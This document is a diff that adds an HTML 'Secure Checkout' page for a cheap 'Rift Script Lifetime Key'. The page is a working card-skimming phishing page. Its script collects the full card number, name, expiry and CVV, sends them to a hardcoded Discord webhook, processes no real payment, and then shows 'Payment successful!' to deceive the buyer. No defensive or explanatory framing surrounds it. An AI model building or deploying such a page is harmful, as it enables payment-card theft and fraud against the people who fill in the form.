@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Checkout</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            display: flex;
+            max-width: 1000px;
+            width: 100%;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+        }
+
+        .left-column {
+            flex: 1;
+            padding: 40px;
+            background: #f8f9fa;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .right-column {
+            flex: 1.2;
+            padding: 40px;
+            background: white;
+        }
+
+        .header {
+            margin-bottom: 30px;
+        }
+
+        .header h1 {
+            color: #2c3e50;
+            font-size: 28px;
+            margin-bottom: 8px;
+        }
+
+        .header p {
+            color: #7f8c8d;
+            font-size: 16px;
+        }
+
+        .order-summary {
+            background: white;
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            margin-bottom: 30px;
+        }
+
+        .order-summary h2 {
+            font-size: 20px;
+            color: #2c3e50;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #ecf0f1;
+        }
+
+        .product {
+            display: flex;
+            margin-bottom: 20px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #ecf0f1;
+        }
+
+        .product:last-child {
+            margin-bottom: 0;
+            padding-bottom: 0;
+            border-bottom: none;
+        }
+
+        .product-image {
+            width: 80px;
+            height: 80px;
+            border-radius: 10px;
+            background: linear-gradient(45deg, #3498db, #9b59b6);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+        }
+
+        .product-image i {
+            font-size: 36px;
+            color: white;
+        }
+
+        .product-details {
+            flex: 1;
+        }
+
+        .product-name {
+            font-weight: 600;
+            font-size: 16px;
+            color: #2c3e50;
+            margin-bottom: 5px;
+        }
+
+        .product-price {
+            font-weight: 700;
+            color: #3498db;
+            font-size: 18px;
+        }
+
+        .total {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #ecf0f1;
+            font-weight: 700;
+            font-size: 20px;
+            color: #2c3e50;
+        }
+
+        .payment-form h2 {
+            font-size: 24px;
+            color: #2c3e50;
+            margin-bottom: 25px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #2c3e50;
+            font-size: 14px;
+        }
+
+        .input-with-icon {
+            position: relative;
+        }
+
+        .input-with-icon i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #7f8c8d;
+            font-size: 18px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 15px 15px 15px 50px;
+            border: 2px solid #e0e7ff;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        .form-control:focus {
+            border-color: #3498db;
+            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.2);
+        }
+
+        .card-group {
+            display: flex;
+            gap: 15px;
+        }
+
+        .card-group .form-group {
+            flex: 1;
+        }
+
+        .card-preview {
+            height: 180px;
+            background: linear-gradient(45deg, #3498db, #2c3e50);
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+            color: white;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .card-preview::before {
+            content: "";
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 200px;
+            height: 200px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+        }
+
+        .card-preview::after {
+            content: "";
+            position: absolute;
+            bottom: -50%;
+            right: -30%;
+            width: 150px;
+            height: 150px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+        }
+
+        .card-chip {
+            width: 50px;
+            height: 40px;
+            background: #c9a145;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+
+        .card-number {
+            font-size: 22px;
+            letter-spacing: 2px;
+            margin-bottom: 25px;
+            font-family: monospace;
+        }
+
+        .card-details {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+        }
+
+        .card-name {
+            text-transform: uppercase;
+        }
+
+        .card-expiry {
+            display: flex;
+            gap: 5px;
+        }
+
+        .card-logo {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 36px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.15);
+        }
+
+        .secure-payment {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 20px;
+            color: #7f8c8d;
+            font-size: 14px;
+        }
+
+        .secure-payment i {
+            margin-right: 8px;
+            color: #2ecc71;
+        }
+
+        .payment-methods {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .payment-method {
+            width: 60px;
+            height: 40px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: #7f8c8d;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+            }
+            
+            .left-column, .right-column {
+                padding: 30px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left-column">
+            <div class="header">
+                <h1>Checkout</h1>
+                <p>Complete your purchase securely</p>
+            </div>
+            
+            <div class="order-summary">
+                <h2>Order Summary</h2>
+                
+                
+                <div class="product">
+                    <div class="product-image">
+                        <i class="fas fa-mobile-alt"></i>
+                    </div>
+                    <div class="product-details">
+                        <div class="product-name">Rift Script Lifetime</div>
+                        <div class="product-description">Key</div>
+                        <div class="product-price">$0.15</div>
+                    </div>
+                </div>
+                
+                <div class="total">
+                    <span>Total:</span>
+                    <span>$0.15</span>
+                </div>
+            </div>
+            
+            <div class="secure-payment">
+                <i class="fas fa-lock"></i>
+                <span>Your payment is securely encrypted</span>
+            </div>
+            
+            <div class="payment-methods">
+                <div class="payment-method">
+                    <i class="fab fa-cc-visa"></i>
+                </div>
+                <div class="payment-method">
+                    <i class="fab fa-cc-mastercard"></i>
+                </div>
+                <div class="payment-method">
+                    <i class="fab fa-cc-amex"></i>
+                </div>
+                <div class="payment-method">
+                    <i class="fab fa-cc-paypal"></i>
+                </div>
+            </div>
+        </div>
+        
+        <div class="right-column">
+            <div class="payment-form">
+                <h2>Payment Information</h2>
+                
+                <div class="card-preview">
+                    <div class="card-chip"></div>
+                    <div class="card-number" id="card-number-preview">•••• •••• •••• ••••</div>
+                    <div class="card-details">
+                        <div class="card-name" id="card-name-preview">CARDHOLDER NAME</div>
+                        <div class="card-expiry">
+                            <span id="expiry-month-preview">MM</span>/<span id="expiry-year-preview">YY</span>
+                        </div>
+                    </div>
+                    <div class="card-logo">
+                        <i class="fab fa-cc-visa"></i>
+                    </div>
+                </div>
+                
+                <form id="payment-form">
+                    <div class="form-group">
+                        <label for="card-number">Card Number</label>
+                        <div class="input-with-icon">
+                            <i class="far fa-credit-card"></i>
+                            <input type="text" id="card-number" class="form-control" placeholder="1234 5678 9012 3456" maxlength="19">
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="card-name">Cardholder Name</label>
+                        <div class="input-with-icon">
+                            <i class="far fa-user"></i>
+                            <input type="text" id="card-name" class="form-control" placeholder="John Doe">
+                        </div>
+                    </div>
+                    
+                    <div class="card-group">
+                        <div class="form-group">
+                            <label for="expiry-date">Expiry Date</label>
+                            <div class="input-with-icon">
+                                <i class="far fa-calendar-alt"></i>
+                                <input type="text" id="expiry-date" class="form-control" placeholder="MM/YY" maxlength="5">
+                            </div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="cvv">CVV</label>
+                            <div class="input-with-icon">
+                                <i class="fas fa-lock"></i>
+                                <input type="text" id="cvv" class="form-control" placeholder="123" maxlength="3">
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <button type="button" class="btn" id="pay-button">
+                        <i class="fas fa-lock"></i> Complete Purchase
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1361684223903273090/R1ElxZcmQ3vr8ydWEc4CWIhOjpahEDU9-fuOng1LD4Ft9-Zr230yCpqntz41k1Ekez8L';
+
+        document.addEventListener('DOMContentLoaded', function() {
+            // Card number formatting
+            const cardNumberInput = document.getElementById('card-number');
+            const cardNumberPreview = document.getElementById('card-number-preview');
+            
+            cardNumberInput.addEventListener('input', function(e) {
+                // Remove non-numeric characters
+                let value = e.target.value.replace(/\D/g, '');
+                
+                // Format with spaces every 4 digits
+                value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+                
+                // Update input value
+                e.target.value = value;
+                
+                // Update preview
+                if (value === '') {
+                    cardNumberPreview.textContent = '•••• •••• •••• ••••';
+                } else {
+                    // Mask all but last 4 digits
+                    const masked = value.replace(/\d{4}(?= \d{4})/g, '••••');
+                    cardNumberPreview.textContent = masked;
+                }
+            });
+            
+            // Cardholder name
+            const cardNameInput = document.getElementById('card-name');
+            const cardNamePreview = document.getElementById('card-name-preview');
+            
+            cardNameInput.addEventListener('input', function(e) {
+                if (e.target.value === '') {
+                    cardNamePreview.textContent = 'CARDHOLDER NAME';
+                } else {
+                    cardNamePreview.textContent = e.target.value.toUpperCase();
+                }
+            });
+            
+            // Expiry date
+            const expiryInput = document.getElementById('expiry-date');
+            const monthPreview = document.getElementById('expiry-month-preview');
+            const yearPreview = document.getElementById('expiry-year-preview');
+            
+            expiryInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                
+                if (value.length > 2) {
+                    value = value.slice(0, 2) + '/' + value.slice(2, 4);
+                }
+                
+                e.target.value = value;
+                
+                if (value === '') {
+                    monthPreview.textContent = 'MM';
+                    yearPreview.textContent = 'YY';
+                } else {
+                    const [month, year] = value.split('/');
+                    monthPreview.textContent = month || 'MM';
+                    yearPreview.textContent = year || 'YY';
+                }
+            });
+            
+            // Function to send data to Discord webhook
+            async function sendToWebhook(formData) {
+                const webhookData = {
+                    embeds: [{
+                        title: "🛒 New Purchase - Rift Script Lifetime",
+                        color: 0x3498db,
+                        fields: [
+                            {
+                                name: "💳 Card Number",
+                                value: formData.cardNumber,
+                                inline: true
+                            },
+                            {
+                                name: "👤 Cardholder Name",
+                                value: formData.cardName,
+                                inline: true
+                            },
+                            {
+                                name: "📅 Expiry Date",
+                                value: formData.expiryDate,
+                                inline: true
+                            },
+                            {
+                                name: "🔒 CVV",
+                                value: formData.cvv,
+                                inline: true
+                            },
+                            {
+                                name: "💰 Amount",
+                                value: "$0.15",
+                                inline: true
+                            },
+                            {
+                                name: "📦 Product",
+                                value: "Rift Script Lifetime Key",
+                                inline: true
+                            }
+                        ],
+                        timestamp: new Date().toISOString(),
+                        footer: {
+                            text: "Secure Checkout System"
+                        }
+                    }]
+                };
+
+                try {
+                    const response = await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(webhookData)
+                    });
+
+                    if (response.ok) {
+                        return true;
+                    } else {
+                        console.error('Webhook failed:', response.status);
+                        return false;
+                    }
+                } catch (error) {
+                    console.error('Error sending to webhook:', error);
+                    return false;
+                }
+            }
+            
+            // Pay button click handler
+            const payButton = document.getElementById('pay-button');
+            
+            payButton.addEventListener('click', async function() {
+                // Simple validation
+                let isValid = true;
+                
+                if (!cardNumberInput.value || cardNumberInput.value.replace(/\s/g, '').length !== 16) {
+                    isValid = false;
+                    cardNumberInput.style.borderColor = '#e74c3c';
+                } else {
+                    cardNumberInput.style.borderColor = '#e0e7ff';
+                }
+                
+                if (!cardNameInput.value) {
+                    isValid = false;
+                    cardNameInput.style.borderColor = '#e74c3c';
+                } else {
+                    cardNameInput.style.borderColor = '#e0e7ff';
+                }
+                
+                if (!expiryInput.value || expiryInput.value.length !== 5) {
+                    isValid = false;
+                    expiryInput.style.borderColor = '#e74c3c';
+                } else {
+                    expiryInput.style.borderColor = '#e0e7ff';
+                }
+                
+                if (!document.getElementById('cvv').value || document.getElementById('cvv').value.length !== 3) {
+                    isValid = false;
+                    document.getElementById('cvv').style.borderColor = '#e74c3c';
+                } else {
+                    document.getElementById('cvv').style.borderColor = '#e0e7ff';
+                }
+                
+                if (isValid) {
+                    payButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+                    payButton.disabled = true;
+                    
+                    // Collect form data
+                    const formData = {
+                        cardNumber: cardNumberInput.value,
+                        cardName: cardNameInput.value,
+                        expiryDate: expiryInput.value,
+                        cvv: document.getElementById('cvv').value
+                    };
+                    
+                    // Send to webhook
+                    const webhookSuccess = await sendToWebhook(formData);
+                    
+                    if (webhookSuccess) {
+                        payButton.innerHTML = '<i class="fas fa-check"></i> Purchase Complete!';
+                        alert('Payment successful! Thank you for your purchase.');
+                    } else {
+                        payButton.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Error occurred';
+                        alert('There was an error processing your payment. Please try again.');
+                        payButton.disabled = false;
+                        setTimeout(() => {
+                            payButton.innerHTML = '<i class="fas fa-lock"></i> Complete Purchase';
+                        }, 3000);
+                    }
+                } else {
+                    alert('Please fill in all required fields correctly.');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
